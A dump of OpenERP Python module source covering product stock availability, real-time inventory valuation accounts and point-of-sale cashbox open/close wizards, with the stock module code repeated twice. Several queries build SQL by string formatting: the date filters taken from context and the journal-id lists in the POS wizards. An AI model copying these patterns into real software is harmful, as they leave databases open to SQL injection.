            if res2:
                context['location'] = res2[0]

        if context.get('location', False):
            if type(context['location']) == type(1):
                location_ids = [context['location']]
            elif type(context['location']) in (type(''), type(u'')):
                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)
            else:
                location_ids = context['location']
        else:
            location_ids = []
            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)
            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):
                location_ids.append(w.lot_stock_id.id)

        # build the list of ids of children of the location given by id
        if context.get('compute_child',True):
            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])
            location_ids = child_location_ids or location_ids
        else:
            location_ids = location_ids

        uoms_o = {}
        product2uom = {}
        for product in self.browse(cr, uid, ids, context=context):
            product2uom[product.id] = product.uom_id.id
            uoms_o[product.uom_id.id] = product.uom_id

        results = []
        results2 = []

        from_date=context.get('from_date',False)                    
        to_date=context.get('to_date',False)                    
        date_str=False                    
        if from_date and to_date:
            date_str="date_planned>='%s' and date_planned<='%s'"%(from_date,to_date)                    
        elif from_date:
            date_str="date_planned>='%s'"%(from_date)                    
        elif to_date:
            date_str="date_planned<='%s'"%(to_date)                    

        if 'in' in what:
            # all moves from a location out of the set to a location in the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id NOT IN %s'\
                'and location_dest_id IN %s'\
                'and product_id IN %s'\
                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results = cr.fetchall()
        if 'out' in what:
            # all moves from a location in the set to a location out of the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id IN %s'\
                'and location_dest_id NOT IN %s '\
                'and product_id  IN %s'\
                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results2 = cr.fetchall()
        uom_obj = self.pool.get('product.uom')
        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)
        if context.get('uom', False):
            uoms += [context['uom']]

        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)
        if uoms:
            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)
        for o in uoms:
            uoms_o[o.id] = o
        for amount, prod_id, prod_uom in results:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] += amount
        for amount, prod_id, prod_uom in results2:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] -= amount
        return res

    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):
        """ Finds the incoming and outgoing quantity of product.
        @return: Dictionary of values
        """
        if not field_names:
            field_names = []
        if context is None:
            context = {}
        res = {}
        for id in ids:
            res[id] = {}.fromkeys(field_names, 0.0)
        for f in field_names:
            c = context.copy()
            if f == 'qty_available':
                c.update({ 'states': ('done',), 'what': ('in', 'out') })
            if f == 'virtual_available':
                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })
            if f == 'incoming_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })
            if f == 'outgoing_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })
            stock = self.get_product_available(cr, uid, ids, context=c)
            for id in ids:
                res[id][f] = stock.get(id, 0.0)
        return res

    _columns = {
        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help="Current quantities of products in selected locations or all internal if none have been selected.", multi='qty_available'),
        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help="Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.", multi='qty_available'),
        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help="Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.", multi='qty_available'),
        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help="Quantities of products that are planned to leave in selected locations or all internal if none have been selected.", multi='qty_available'),
        'track_production': fields.boolean('Track Manufacturing Lots' , help="Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order"),
        'track_incoming': fields.boolean('Track Incoming Lots', help="Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location"),
        'track_outgoing': fields.boolean('Track Outgoing Lots', help="Forces to specify a Production Lot for all moves containing this product and going to a Customer Location"),
        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),
        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),
                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', 
                                        help="If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves." \
                                             "The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products."
                                        , required=True),
    }

    _defaults = {
        'valuation': lambda *a: 'manual_periodic',
    }

    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):
        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)
        if context is None:
            context = {}
        if ('location' in context) and context['location']:
            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])
            fields=res.get('fields',{})
            if fields:
                if location_info.usage == 'supplier':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Receptions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Received Qty')

                if location_info.usage == 'internal':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Stock')

                if location_info.usage == 'customer':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Deliveries')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Delivered Qty')

                if location_info.usage == 'inventory':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future P&L')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('P&L Qty')

                if location_info.usage == 'procurement':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Qty')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Unplanned Qty')

                if location_info.usage == 'production':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Productions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Produced Qty')
        return res

product_product()

class product_template(osv.osv):
    _name = 'product.template'
    _inherit = 'product.template'
    _columns = {
        'property_stock_procurement': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Procurement Location",
            method=True,
            view_load=True,
            domain=[('usage','like','procurement')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements"),
        'property_stock_production': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Production Location",
            method=True,
            view_load=True,
            domain=[('usage','like','production')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders"),
        'property_stock_inventory': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Inventory Location",
            method=True,
            view_load=True,
            domain=[('usage','like','inventory')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory"),
        'property_stock_account_input': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
        'property_stock_account_output': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
    }

product_template()

class product_category(osv.osv):

    _inherit = 'product.category'
    _columns = {
        'property_stock_journal': fields.property('account.journal',
            relation='account.journal', type='many2one',
            string='Stock journal', method=True, view_load=True,
            help="When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed."),
        'property_stock_account_input_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_account_output_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_variation': fields.property('account.account',
            type='many2one',
            relation='account.account',
            string="Stock Variation Account",
            method=True, view_load=True,
            help="When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.",),
    }

product_category()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import fields, osv
from tools.translate import _

class product_product(osv.osv):
    _inherit = "product.product"

    def get_product_accounts(self, cr, uid, product_id, context=None):
        """ To get the stock input account, stock output account and stock journal related to product.
        @param product_id: product id
        @return: dictionary which contains information regarding stock input account, stock output account and stock journal
        """
        if context is None:
            context = {}
        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)

        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False
        if not stock_input_acc:
            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False

        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False
        if not stock_output_acc:
            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False

        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False
        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False

        return {
            'stock_account_input': stock_input_acc,
            'stock_account_output': stock_output_acc,
            'stock_journal': journal_id,
            'property_stock_variation': account_variation
        }

    def do_change_standard_price(self, cr, uid, ids, datas, context={}):
        """ Changes the Standard Price of Product and creates an account move accordingly.
        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal
        @param context: A standard dictionary
        @return:

        """
        location_obj = self.pool.get('stock.location')
        move_obj = self.pool.get('account.move')
        move_line_obj = self.pool.get('account.move.line')

        new_price = datas.get('new_price', 0.0)
        stock_output_acc = datas.get('stock_output_account', False)
        stock_input_acc = datas.get('stock_input_account', False)
        journal_id = datas.get('stock_journal', False)
        product_obj=self.browse(cr,uid,ids)[0]
        account_variation = product_obj.categ_id.property_stock_variation
        account_variation_id = account_variation and account_variation.id or False
        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))
        move_ids = []
        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])
        for rec_id in ids:
            for location in location_obj.browse(cr, uid, loc_ids):
                c = context.copy()
                c.update({
                    'location': location.id,
                    'compute_child': False
                })

                product = self.browse(cr, uid, rec_id, context=c)
                qty = product.qty_available
                diff = product.standard_price - new_price
                if not diff: raise osv.except_osv(_('Error!'), _("Could not find any difference between standard price and new price!"))
                if qty:
                    company_id = location.company_id and location.company_id.id or False
                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))
                    #
                    # Accounting Entries
                    #
                    if not journal_id:
                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False
                    if not journal_id:
                        raise osv.except_osv(_('Error!'),
                            _('There is no journal defined '\
                                'on the product category: "%s" (id: %d)') % \
                                (product.categ_id.name,
                                    product.categ_id.id,))
                    move_id = move_obj.create(cr, uid, {
                                'journal_id': journal_id,
                                'company_id': company_id
                                })

                    move_ids.append(move_id)


                    if diff > 0:
                        if not stock_input_acc:
                            stock_input_acc = product.product_tmpl_id.\
                                property_stock_account_input.id
                        if not stock_input_acc:
                            stock_input_acc = product.categ_id.\
                                    property_stock_account_input_categ.id
                        if not stock_input_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock input account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * diff
                        move_line_obj.create(cr, uid, {
                                    'name': product.name,
                                    'account_id': stock_input_acc,
                                    'debit': amount_diff,
                                    'move_id': move_id,
                                    })
                        move_line_obj.create(cr, uid, {
                                    'name': product.categ_id.name,
                                    'account_id': account_variation_id,
                                    'credit': amount_diff,
                                    'move_id': move_id
                                    })
                    elif diff < 0:
                        if not stock_output_acc:
                            stock_output_acc = product.product_tmpl_id.\
                                property_stock_account_output.id
                        if not stock_output_acc:
                            stock_output_acc = product.categ_id.\
                                    property_stock_account_output_categ.id
                        if not stock_output_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock output account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * -diff
                        move_line_obj.create(cr, uid, {
                                        'name': product.name,
                                        'account_id': stock_output_acc,
                                        'credit': amount_diff,
                                        'move_id': move_id
                                    })
                        move_line_obj.create(cr, uid, {
                                        'name': product.categ_id.name,
                                        'account_id': account_variation_id,
                                        'debit': amount_diff,
                                        'move_id': move_id
                                    })

            self.write(cr, uid, rec_id, {'standard_price': new_price})

        return move_ids

    def view_header_get(self, cr, user, view_id, view_type, context=None):
        if context is None:
            context = {}
        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)
        if res: return res
        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):
            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name
        return res

    def get_product_available(self, cr, uid, ids, context=None):
        """ Finds whether product is available or not in particular warehouse.
        @return: Dictionary of values
        """
        if context is None:
            context = {}
        states = context.get('states',[])
        what = context.get('what',())
        if not ids:
            ids = self.search(cr, uid, [])
        res = {}.fromkeys(ids, 0.0)
        if not ids:
            return res

        if context.get('shop', False):
            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))
            res2 = cr.fetchone()
            if res2:
                context['warehouse'] = res2[0]

        if context.get('warehouse', False):
            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))
            res2 = cr.fetchone()
            if res2:
                context['location'] = res2[0]

        if context.get('location', False):
            if type(context['location']) == type(1):
                location_ids = [context['location']]
            elif type(context['location']) in (type(''), type(u'')):
                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)
            else:
                location_ids = context['location']
        else:
            location_ids = []
            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)
            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):
                location_ids.append(w.lot_stock_id.id)

        # build the list of ids of children of the location given by id
        if context.get('compute_child',True):
            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])
            location_ids = child_location_ids or location_ids
        else:
            location_ids = location_ids

        uoms_o = {}
        product2uom = {}
        for product in self.browse(cr, uid, ids, context=context):
            product2uom[product.id] = product.uom_id.id
            uoms_o[product.uom_id.id] = product.uom_id

        results = []
        results2 = []

        from_date=context.get('from_date',False)                    
        to_date=context.get('to_date',False)                    
        date_str=False                    
        if from_date and to_date:
            date_str="date_planned>='%s' and date_planned<='%s'"%(from_date,to_date)                    
        elif from_date:
            date_str="date_planned>='%s'"%(from_date)                    
        elif to_date:
            date_str="date_planned<='%s'"%(to_date)                    

        if 'in' in what:
            # all moves from a location out of the set to a location in the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id NOT IN %s'\
                'and location_dest_id IN %s'\
                'and product_id IN %s'\
                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results = cr.fetchall()
        if 'out' in what:
            # all moves from a location in the set to a location out of the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id IN %s'\
                'and location_dest_id NOT IN %s '\
                'and product_id  IN %s'\
                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results2 = cr.fetchall()
        uom_obj = self.pool.get('product.uom')
        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)
        if context.get('uom', False):
            uoms += [context['uom']]

        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)
        if uoms:
            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)
        for o in uoms:
            uoms_o[o.id] = o
        for amount, prod_id, prod_uom in results:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] += amount
        for amount, prod_id, prod_uom in results2:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] -= amount
        return res

    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):
        """ Finds the incoming and outgoing quantity of product.
        @return: Dictionary of values
        """
        if not field_names:
            field_names = []
        if context is None:
            context = {}
        res = {}
        for id in ids:
            res[id] = {}.fromkeys(field_names, 0.0)
        for f in field_names:
            c = context.copy()
            if f == 'qty_available':
                c.update({ 'states': ('done',), 'what': ('in', 'out') })
            if f == 'virtual_available':
                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })
            if f == 'incoming_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })
            if f == 'outgoing_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })
            stock = self.get_product_available(cr, uid, ids, context=c)
            for id in ids:
                res[id][f] = stock.get(id, 0.0)
        return res

    _columns = {
        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help="Current quantities of products in selected locations or all internal if none have been selected.", multi='qty_available'),
        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help="Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.", multi='qty_available'),
        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help="Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.", multi='qty_available'),
        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help="Quantities of products that are planned to leave in selected locations or all internal if none have been selected.", multi='qty_available'),
        'track_production': fields.boolean('Track Manufacturing Lots' , help="Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order"),
        'track_incoming': fields.boolean('Track Incoming Lots', help="Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location"),
        'track_outgoing': fields.boolean('Track Outgoing Lots', help="Forces to specify a Production Lot for all moves containing this product and going to a Customer Location"),
        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),
        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),
                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', 
                                        help="If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves." \
                                             "The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products."
                                        , required=True),
    }

    _defaults = {
        'valuation': lambda *a: 'manual_periodic',
    }

    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):
        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)
        if context is None:
            context = {}
        if ('location' in context) and context['location']:
            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])
            fields=res.get('fields',{})
            if fields:
                if location_info.usage == 'supplier':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Receptions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Received Qty')

                if location_info.usage == 'internal':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Stock')

                if location_info.usage == 'customer':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Deliveries')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Delivered Qty')

                if location_info.usage == 'inventory':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future P&L')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('P&L Qty')

                if location_info.usage == 'procurement':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Qty')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Unplanned Qty')

                if location_info.usage == 'production':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Productions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Produced Qty')
        return res

product_product()

class product_template(osv.osv):
    _name = 'product.template'
    _inherit = 'product.template'
    _columns = {
        'property_stock_procurement': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Procurement Location",
            method=True,
            view_load=True,
            domain=[('usage','like','procurement')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements"),
        'property_stock_production': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Production Location",
            method=True,
            view_load=True,
            domain=[('usage','like','production')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders"),
        'property_stock_inventory': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Inventory Location",
            method=True,
            view_load=True,
